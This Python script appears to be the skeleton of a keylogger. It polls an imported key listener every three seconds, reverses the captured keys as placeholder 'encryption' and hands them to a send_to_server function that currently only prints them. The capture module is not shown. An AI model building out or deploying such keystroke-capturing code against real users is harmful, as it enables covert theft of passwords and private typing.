import time
import threading
from listener import Listener

class Manager:
    def __init__(self):
        self.listener = Listener()
        self.process = threading.Thread(target=self.listener.run)
    def start(self):
        self.process.start()
        while True:
            time.sleep(3)
            a = self.listener.get_keys()
            e = encrypt(a)
            send_to_server(e)



def encrypt(data):
    return str((data[::-1]))

def send_to_server(data):
    print(data)

p = Manager()
p.start()
